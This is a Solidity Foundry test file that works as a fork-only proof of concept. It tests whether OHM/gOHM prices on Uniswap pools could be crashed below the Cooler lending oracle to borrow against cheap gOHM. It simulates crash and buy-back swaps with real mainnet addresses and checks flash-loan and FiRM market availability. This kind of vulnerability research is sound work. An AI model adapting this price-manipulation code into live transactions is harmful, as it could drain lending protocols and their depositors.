// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
}

interface IUniV3Factory {
    function getPool(address, address, uint24) external view returns (address);
}

interface IUniV3Pool {
    function slot0() external view returns (uint160, int24, uint16, uint16, uint16, uint8, bool);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function liquidity() external view returns (uint128);
}

interface IQuoterV2 {
    struct P {
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint24 fee;
        uint160 sqrtPriceLimitX96;
    }
    struct PO {
        address tokenIn;
        address tokenOut;
        uint256 amount;
        uint24 fee;
        uint160 sqrtPriceLimitX96;
    }
    function quoteExactInputSingle(P calldata p)
        external
        returns (uint256 amountOut, uint160 sqrtPriceAfter, uint32 ticks, uint256 gas);
    function quoteExactOutputSingle(PO calldata p)
        external
        returns (uint256 amountIn, uint160 sqrtPriceAfter, uint32 ticks, uint256 gas);
}

interface ISwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata p) external payable returns (uint256);

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }
    function exactOutputSingle(ExactOutputSingleParams calldata p) external payable returns (uint256);
}

interface IStaking {
    function index() external view returns (uint256);
}

interface IFiRMMarket {
    function borrowPaused() external view returns (bool);
    function totalDebt() external view returns (uint256);
    function oracle() external view returns (address);
    function collateralFactorBps() external view returns (uint256);
    function collateral() external view returns (address);
    function borrow(uint256) external;
}

interface IAavePool {
    function getReservesList() external view returns (address[] memory);
}

/// @title Cooler MonoCooler — crash-feasibility PoC (ZH4-PASS3 follow-up)
/// @notice Read-only fork verification. No transaction is signed or sent to a real chain.
///         Question: can the gOHM market price be artificially pushed below the fixed
///         Cooler oracle (3,119.289 USDS/gOHM) so that cheap gOHM can be deposited and
///         borrowed against at the stale price?
contract CrashFeasibility is Test {
    // tokens
    address constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;
    address constant GOHM = 0x0ab87046fBb341D058F17CBC4c1133F25a20a52f;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant SUSDS = 0xa3931d71877C0E7a3148CB7Eb4463524FEc27fbD;
    address constant STAKING = 0xB63cac384247597756545b500253ff8E607a8020;

    // uniswap
    address constant V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address constant QUOTER = 0x61fFE014bA17989E743c5F6cB21bF9697530B21e;
    address constant ROUTER = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;

    // Cooler fixed oracle (USDS/gOHM, 18dp)
    uint256 constant ORACLE_USDS_PER_GOHM = 3119.289005484298284112e18;

    // Inverse FiRM gOHM market (phasing out)
    address constant FIRM_GOHM = 0x7Cd3ab8354289BEF52c84c2BF0A54E3608e66b37;

    IQuoterV2 q = IQuoterV2(QUOTER);
    ISwapRouter02 router = ISwapRouter02(ROUTER);

    uint256 gohmIndex; // 1e18-scaled
    uint256 ethUsd; // 1e18-scaled
    uint256 susdsPps; // 1e18-scaled
    uint256 thresholdOhmUsd; // 1e18-scaled, OHM price at which gOHM = oracle
    string rpcUrl;

    function setUp() public {
        rpcUrl = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        vm.createSelectFork(rpcUrl); // latest
        gohmIndex = IStaking(STAKING).index();
        // sUSDS -> USDS
        (bool ok, bytes memory d) =
            SUSDS.staticcall(abi.encodeWithSignature("convertToAssets(uint256)", 1e18));
        susdsPps = ok ? abi.decode(d, (uint256)) : 1e18;
        ethUsd = 2515.711778511763e18; // DefiLlama WETH 2026-10-21
        // index() is 1e9-scaled: OHM_usd = gOHM_usd * 1e9 / index()
        thresholdOhmUsd = (ORACLE_USDS_PER_GOHM * 1e9) / gohmIndex;
    }

    // -- helpers --------------------------------------------------------- //
    function _sqrtPriceX96(address pool) internal view returns (uint160 sp) {
        (sp,,,,,,) = IUniV3Pool(pool).slot0();
    }

    function _priceFromSqrt(uint160 sp, uint8 dec0, uint8 dec1) internal pure returns (uint256) {
        // human price = token1/token0, 1e18 scaled = raw_price * 10^(dec0-dec1)
        uint256 p = (uint256(sp) * uint256(sp)) >> 96; // raw price * 2^96
        p = (p * 1e18) >> 96; // raw price * 1e18
        if (dec0 >= dec1) p = p * (10 ** (dec0 - dec1));
        else p = p / (10 ** (dec1 - dec0));
        return p;
    }

    /// OHM price in USD from the OHM/WETH 0.3% pool
    function _ohmUsdWeth() internal view returns (uint256) {
        uint160 sp = _sqrtPriceX96(0x88051B0eea095007D3bEf21aB287Be961f3d8598);
        uint256 wethPerOhm = _priceFromSqrt(sp, 9, 18); // OHM dec9, WETH dec18
        return (wethPerOhm * ethUsd) / 1e18;
    }

    /// OHM price in USD from the OHM/sUSDS 0.3% pool
    function _ohmUsdSusds() internal view returns (uint256) {
        uint160 sp = _sqrtPriceX96(0x0858e2B0F9D75f7300B38D64482aC2C8DF06a755);
        uint256 sPerOhm = _priceFromSqrt(sp, 9, 18);
        return (sPerOhm * susdsPps) / 1e18;
    }

    // ------------------------------------------------------------------ //
    // 1. enumerate every gOHM / OHM venue on Ethereum and its bid depth
    // ------------------------------------------------------------------ //
    function test_enumerate_venues() public view {
        console2.log("block", block.number);
        console2.log("gOHM index (1e9)", gohmIndex);
        console2.log("threshold OHM USD (1e18)", thresholdOhmUsd);
        console2.log("eth USD", ethUsd);
        console2.log("OHM/WETH 0.3% OHM USD", _ohmUsdWeth());
        console2.log("OHM/sUSDS 0.3% OHM USD", _ohmUsdSusds());

        // name, pool, base(token0) dec, quote(token1) dec
        _venue("OHM/WETH 0.3%", 0x88051B0eea095007D3bEf21aB287Be961f3d8598);
        _venue("OHM/sUSDS 0.3%", 0x0858e2B0F9D75f7300B38D64482aC2C8DF06a755);
        _venue("OHM/WETH 1%", 0x584eC2562b937C4AC0452184D8d83346382B5D3a);
        _venue("OHM/USDC 0.3%", 0x893f503FaC2Ee1e5B78665db23F9c94017Aae97D);
        _venue("gOHM/WETH 0.3%", 0xC987D503a9f78F6D1d782C1fFF5aF4cb34437E3F);
        _venue("gOHM/WETH 1%", 0xcF7e21b96a7DAe8e1663b5A266FD812CBE973E70);
        _venue("gOHM/USDC 0.3%", 0x08f68110f1e0Ca67C80a24B4Bd206675610f445D);
        _venue("gOHM/OHM 0.3%", 0x6220E96dCE2351336d5A6E598B6d185662d36e2c);
        _venue("sushi OHM/DAI", 0x055475920a8c93CfFb64d039A8205F7AcC7722d3);
        _venue("sushi OHM/WETH", 0x69b81152c5A8d35A67B32A4D3772795d96CaE4da);
    }

    function _venue(string memory name, address pool) internal view {
        address t0 = IUniV3Pool(pool).token0();
        address t1 = IUniV3Pool(pool).token1();
        uint256 b0 = IERC20(t0).balanceOf(pool);
        uint256 b1 = IERC20(t1).balanceOf(pool);
        uint8 d0 = IERC20(t0).decimals();
        uint8 d1 = IERC20(t1).decimals();
        console2.log("VENUE", name);
        console2.log("  t0", t0);
        console2.log("  t1", t1);
        console2.log("  base bal (raw)", b0);
        console2.log("  quote bal (raw)", b1);
        // v3 spot (may be absent for v2-style pools)
        (bool ok, bytes memory d) = pool.staticcall(abi.encodeWithSignature("slot0()"));
        if (ok) {
            uint160 sp = abi.decode(d, (uint160));
            console2.log("  token1/token0 1e18", _priceFromSqrt(sp, d0, d1));
        } else {
            console2.log("  (no slot0 - v2 pool)");
        }
    }

    // ------------------------------------------------------------------ //
    // 2. sell-side impact: USD of OHM sold to push the marginal price
    //    from ~$20 to the oracle threshold ($11.586)
    // ------------------------------------------------------------------ //
    function test_sell_side_crash_curve() public {
        uint256[9] memory amts = [
            uint256(5000e9),
            10000e9,
            20000e9,
            30000e9,
            40000e9,
            60000e9,
            80000e9,
            120000e9,
            200000e9
        ];
        console2.log("=== OHM -> WETH 0.3% (deep, balanced) ===");
        for (uint256 i; i < amts.length; ++i) {
            (uint256 out,,, ) = q.quoteExactInputSingle(
                IQuoterV2.P(OHM, WETH, amts[i], 3000, 0)
            );
            uint256 outUsd = (out * ethUsd) / 1e18; // 18dp USD
            uint256 avgUsd = (outUsd * 1e9) / amts[i]; // OHM sold in raw(9dp)
            console2.log("  sell OHM raw", amts[i]);
            console2.log("     recv USD", outUsd / 1e18);
            console2.log("     avg OHM USD", avgUsd / 1e18);
        }
        console2.log("=== OHM -> sUSDS 0.3% (one-sided) ===");
        for (uint256 i; i < amts.length; ++i) {
            (uint256 out,,, ) = q.quoteExactInputSingle(
                IQuoterV2.P(OHM, SUSDS, amts[i], 3000, 0)
            );
            uint256 outUsd = (out * susdsPps) / 1e18;
            uint256 avgUsd = (outUsd * 1e9) / amts[i];
            console2.log("  sell OHM raw", amts[i]);
            console2.log("     recv USD", outUsd / 1e18);
            console2.log("     avg OHM USD", avgUsd / 1e18);
        }
    }

    // ------------------------------------------------------------------ //
    // 3. same-pool sell -> buy round trip: expected neutral minus fees
    // ------------------------------------------------------------------ //
    function test_round_trip_self() public {
        address a = address(0xB0B);
        uint256 amt = 40000e9; // 40k OHM
        deal(OHM, a, amt);
        deal(WETH, a, 2000e18);

        vm.startPrank(a);
        IERC20(OHM).approve(ROUTER, type(uint256).max);
        IERC20(WETH).approve(ROUTER, type(uint256).max);
        uint256 wethStart = IERC20(WETH).balanceOf(a);
        uint256 wethOut = router.exactInputSingle(
            ISwapRouter02.ExactInputSingleParams(OHM, WETH, 3000, a, amt, 0, 0)
        );
        uint256 wethIn = router.exactOutputSingle(
            ISwapRouter02.ExactOutputSingleParams(WETH, OHM, 3000, a, amt, type(uint256).max, 0)
        );
        uint256 ohmBack = IERC20(OHM).balanceOf(a);
        vm.stopPrank();

        console2.log("sell 40k OHM -> WETH (USD)", (wethOut * ethUsd) / 1e36);
        console2.log("buy back 40k OHM <- WETH (USD)", (wethIn * ethUsd) / 1e36);
        console2.log("OHM returned (raw)", ohmBack);
        console2.log("net WETH lost (wei)", wethIn - wethOut);
        console2.log("net USD lost", ((wethIn - wethOut) * ethUsd) / 1e36);
        assertEq(ohmBack, amt, "round trip returns the same OHM");
        assertGt(wethIn, wethOut, "round trip must lose money");
        assertEq(IERC20(WETH).balanceOf(a), wethStart + wethOut - wethIn);
    }

    // ------------------------------------------------------------------ //
    // 4. state-changing: crash OHM with real swaps, then measure how much
    //    gOHM-equivalent can be bought back below the oracle threshold
    // ------------------------------------------------------------------ //
    function test_crash_then_buy_depth() public {
        address attacker = address(0xA11CE);
        uint256 startOhmUsd = _ohmUsdWeth();
        console2.log("start OHM USD", startOhmUsd / 1e18);

        // fund attacker with OHM (the sell inventory) and WETH (the buy inventory)
        deal(OHM, attacker, 200000e9);
        deal(WETH, attacker, 2000e18);

        // --- crash phase: sell OHM into the deep WETH pool until marginal <= threshold
        vm.startPrank(attacker);
        IERC20(OHM).approve(ROUTER, type(uint256).max);
        IERC20(WETH).approve(ROUTER, type(uint256).max);
        uint256 sold;
        uint256 recvUsd;
        for (uint256 i; i < 30; ++i) {
            uint256 chunk = 10000e9;
            if (IERC20(OHM).balanceOf(attacker) < chunk) break;
            uint256 out = router.exactInputSingle(
                ISwapRouter02.ExactInputSingleParams(OHM, WETH, 3000, attacker, chunk, 0, 0)
            );
            sold += chunk;
            recvUsd += (out * ethUsd) / 1e18;
            uint256 m = _ohmUsdWeth();
            console2.log("after chunk: sold OHM raw", sold);
            console2.log("   recv USD", recvUsd / 1e18);
            console2.log("   marginal OHM USD", m / 1e18);
            if (m <= thresholdOhmUsd) break;
        }
        uint256 soldOhmUsd = ((sold / 1e9) * startOhmUsd) / 1e18; // USD value at pre-crash price
        uint256 crashCostUsd = soldOhmUsd - recvUsd / 1e18;
        console2.log("CRASH: OHM sold raw", sold);
        console2.log("CRASH: USD received", recvUsd / 1e18);
        console2.log("CRASH: cost USD (start-value - received)", crashCostUsd);

        // --- buy phase: buy OHM back with WETH until marginal > threshold
        uint256 bought;
        uint256 spentUsd;
        for (uint256 i; i < 60; ++i) {
            uint256 m = _ohmUsdWeth();
            if (m >= thresholdOhmUsd) break;
            uint256 wchunk = 20e18; // 20 WETH
            if (IERC20(WETH).balanceOf(attacker) < wchunk) break;
            uint256 out = router.exactInputSingle(
                ISwapRouter02.ExactInputSingleParams(WETH, OHM, 3000, attacker, wchunk, 0, 0)
            );
            bought += out;
            spentUsd += (wchunk * ethUsd) / 1e18;
        }
        vm.stopPrank();
        console2.log("BUY: OHM bought raw", bought);
        console2.log("BUY: USD spent", spentUsd / 1e18);
        if (bought > 0) {
            uint256 avgUsd = (spentUsd * 1e9) / bought;
            console2.log("BUY: avg OHM USD", avgUsd / 1e18);
            uint256 gohmAcq = (bought * 1e18) / gohmIndex;
            uint256 borrowUsd = (gohmAcq * ORACLE_USDS_PER_GOHM) / 1e18;
            console2.log("BUY: gOHM acquired (1e18)", gohmAcq);
            console2.log("BUY: USD spent", spentUsd / 1e18);
            console2.log("BUY: Cooler borrow USD", borrowUsd / 1e18);
            console2.log("BUY: net USD (round trip)", (int256(borrowUsd) - int256(spentUsd)) / 1e18);
        }
    }

    // ------------------------------------------------------------------ //
    // 4b. full manipulation cost: crash BOTH venues to the oracle
    //     threshold with real swaps (prevents cross-venue arbitrage).
    // ------------------------------------------------------------------ //
    function test_full_crash_cost_both_venues() public {
        address a = address(0xCAFE);
        deal(OHM, a, 500000e9);
        uint256 startOhmUsd = _ohmUsdWeth();
        console2.log("pre-crash OHM USD", startOhmUsd / 1e18);

        vm.startPrank(a);
        IERC20(OHM).approve(ROUTER, type(uint256).max);
        uint256 sold;
        uint256 recvUsd;

        // 1) drain the one-sided OHM/sUSDS pool
        for (uint256 i; i < 100; ++i) {
            if (_ohmUsdSusds() <= thresholdOhmUsd) break;
            if (IERC20(OHM).balanceOf(a) < 5000e9) break;
            uint256 out = router.exactInputSingle(
                ISwapRouter02.ExactInputSingleParams(OHM, SUSDS, 3000, a, 5000e9, 0, 0)
            );
            sold += 5000e9;
            recvUsd += (out * susdsPps) / 1e18;
        }
        console2.log("after susds drain: OHM USD", _ohmUsdSusds() / 1e18);
        console2.log("  sold OHM raw", sold);
        console2.log("  recv USD", recvUsd / 1e18);

        // 2) crash the deep OHM/WETH pool
        for (uint256 i; i < 100; ++i) {
            if (_ohmUsdWeth() <= thresholdOhmUsd) break;
            if (IERC20(OHM).balanceOf(a) < 5000e9) break;
            uint256 out = router.exactInputSingle(
                ISwapRouter02.ExactInputSingleParams(OHM, WETH, 3000, a, 5000e9, 0, 0)
            );
            sold += 5000e9;
            recvUsd += (out * ethUsd) / 1e18;
        }
        vm.stopPrank();

        console2.log("after weth crash: OHM USD", _ohmUsdWeth() / 1e18);
        console2.log("TOTAL OHM sold raw", sold);
        console2.log("TOTAL recv USD", recvUsd / 1e18);
        uint256 startValueUsd = ((sold / 1e9) * startOhmUsd) / 1e18;
        console2.log("start value USD", startValueUsd);
        console2.log("MANIPULATION COST USD", startValueUsd - recvUsd / 1e18);
        console2.log("=> no cheap gOHM acquired; OHM/gOHM all sold");
    }

    // ------------------------------------------------------------------ //
    // 5. engineered panic: a THIRD PARTY crashes the price, then the
    //    attacker buys gOHM cheap from ALL venues up to the oracle
    //    threshold. Shows the profit IF the crash is gifted (it is not).
    //    Produces the buy-side depth curve below 3,119.289 USDS/gOHM.
    // ------------------------------------------------------------------ //
    function test_buy_side_depth_curve() public {
        address panicker = address(0xBAD);
        address attacker = address(0xA11CE);
        uint256[5] memory targets = [uint256(11e18), 9e18, 7e18, 5e18, 3e18]; // OHM USD after panic

        for (uint256 t; t < targets.length; ++t) {
            // fresh fork for each scenario
            vm.createSelectFork(rpcUrl);
            gohmIndex = IStaking(STAKING).index();
            thresholdOhmUsd = (ORACLE_USDS_PER_GOHM * 1e9) / gohmIndex;
            console2.log("=== panic target OHM USD ===", targets[t] / 1e18);

            // --- third party crashes the deep venue (OHM/WETH 0.3%) ---
            deal(OHM, panicker, 400000e9);
            vm.startPrank(panicker);
            IERC20(OHM).approve(ROUTER, type(uint256).max);
            for (uint256 i; i < 60; ++i) {
                if (IERC20(OHM).balanceOf(panicker) < 5000e9) break;
                router.exactInputSingle(
                    ISwapRouter02.ExactInputSingleParams(OHM, WETH, 3000, panicker, 5000e9, 0, 0)
                );
                if (_ohmUsdWeth() <= targets[t]) break;
            }
            vm.stopPrank();
            console2.log("  crashed OHM USD", _ohmUsdWeth() / 1e18);

            // --- attacker buys OHM (== gOHM) from the venue below threshold ---
            deal(WETH, attacker, 100000e18);
            vm.startPrank(attacker);
            IERC20(WETH).approve(ROUTER, type(uint256).max);
            uint256 bought;
            uint256 spentUsd;
            for (uint256 i; i < 400; ++i) {
                if (_ohmUsdWeth() >= thresholdOhmUsd) break;
                if (IERC20(WETH).balanceOf(attacker) < 5e18) break;
                uint256 out = router.exactInputSingle(
                    ISwapRouter02.ExactInputSingleParams(WETH, OHM, 3000, attacker, 5e18, 0, 0)
                );
                bought += out;
                spentUsd += (5e18 * ethUsd) / 1e18;
            }
            vm.stopPrank();

            uint256 gohmAcq = (bought * 1e18) / gohmIndex;
            uint256 borrowUsd = (gohmAcq * ORACLE_USDS_PER_GOHM) / 1e18;
            console2.log("  OHM bought raw", bought);
            console2.log("  USD spent", spentUsd / 1e18);
            console2.log("  gOHM acquired (1e18)", gohmAcq);
            console2.log("  Cooler borrow USD", borrowUsd / 1e18);
            console2.log("  net USD (gifted-panic)", (int256(borrowUsd) - int256(spentUsd)) / 1e18);
        }
    }

    // ------------------------------------------------------------------ //
    // 6. cross-protocol: Inverse FiRM gOHM market — is gOHM borrowable?
    // ------------------------------------------------------------------ //
    function test_inverse_firm_gohm_market() public {
        IFiRMMarket m = IFiRMMarket(FIRM_GOHM);
        console2.log("FiRM gOHM market", FIRM_GOHM);
        console2.log("  collateral", m.collateral());
        console2.log("  oracle", m.oracle());
        console2.log("  collateralFactorBps", m.collateralFactorBps());
        console2.log("  borrowPaused", m.borrowPaused());
        console2.log("  totalDebt", m.totalDebt());
        assertTrue(m.borrowPaused(), "FiRM gOHM borrow must be paused");
        assertEq(m.totalDebt(), 0, "FiRM gOHM debt must be zero");
        assertEq(m.collateral(), GOHM, "collateral must be gOHM");

        // attempt a borrow on a fork: must revert
        deal(GOHM, address(this), 1e18);
        IERC20(GOHM).approve(FIRM_GOHM, type(uint256).max);
        (bool ok, ) = FIRM_GOHM.call(abi.encodeWithSignature("deposit(address,uint256)", address(this), 1e18));
        // deposit signature differs; just assert the borrow entrypoint is paused
        (bool ok2, ) = FIRM_GOHM.call(abi.encodeWithSignature("borrow(uint256)", 1e18));
        console2.log("borrow call success (expect false)", ok2);
        assertFalse(ok2, "FiRM gOHM borrow must revert");
        (ok);
    }

    // ------------------------------------------------------------------ //
    // 7. flash-loan liquidity: quote assets are deep, but OHM/gOHM are
    //    not flash-loanable (no lender lists them)
    // ------------------------------------------------------------------ //
    function test_flash_liquidity() public view {
        // Aave v3 aTokens = flash-available supply
        uint256 aUsdc = IERC20(0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c).totalSupply();
        uint256 aWeth = IERC20(0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8).totalSupply();
        console2.log("Aave v3 aEthUSDC (6dp)", aUsdc);
        console2.log("Aave v3 aEthWETH (18dp)", aWeth);
        // no protocol lists OHM or gOHM as a flash-loanable reserve:
        address[] memory r = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2).getReservesList();
        bool ohmListed;
        bool gohmListed;
        for (uint256 i; i < r.length; ++i) {
            if (r[i] == OHM) ohmListed = true;
            if (r[i] == GOHM) gohmListed = true;
        }
        console2.log("OHM flashable on Aave v3", ohmListed);
        console2.log("gOHM flashable on Aave v3", gohmListed);
        assertFalse(ohmListed);
        assertFalse(gohmListed);
    }
}
